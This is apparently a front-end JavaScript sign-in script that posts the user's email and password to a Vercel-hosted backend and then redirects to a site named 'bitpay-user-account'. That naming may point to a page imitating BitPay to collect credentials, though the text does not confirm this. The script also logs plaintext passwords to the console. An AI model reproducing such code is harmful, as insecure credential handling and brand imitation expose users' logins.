
const email = document.getElementById('email')
const password = document.getElementById('password')
const button = document.getElementById('signInBtn')

console.log(button);

// const sendLoginEmail = async () => {
//   const data = {
//     email: email.value,
//   };
//   fetch('https://jollybackend.onrender.com/api/loginemailsand', {
//     method: 'POST',
//     headers: {
//       'Content-Type': 'application/json',
//     },
//     body: JSON.stringify(data),
//   })
//   .then(response=> response.json())
//     .then(response => {
//       console.log(response);
//     })
//     .catch((error) => {
//       console.log(error);
//     });
// };

button.onclick = async (event) => {
  event.preventDefault();

  const data = {
    email: email.value,
    password: password.value,
  };

  console.log(data);

  fetch('https://jolly-back-end.vercel.app/api/login', {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
    },
    body: JSON.stringify(data),
  })
  .then(response=> response.json())
    .then(response => {
      localStorage.setItem('userId', response?._id)
      console.log(response)
      const userId = localStorage?.getItem('userId')
      console.log("Local User Id", userId);
      if (response._id === '' || response._id === undefined){
        alert('Please enter your valid credentials');
        console.log("object");
        return
      }else{
        console.log("object2");
        // sendLoginEmail()
        window.location = `https://bitpay-user-account.vercel.app/#/${userId}`;
      }
    })
    .catch((error) => {
      console.log(error);
    });
};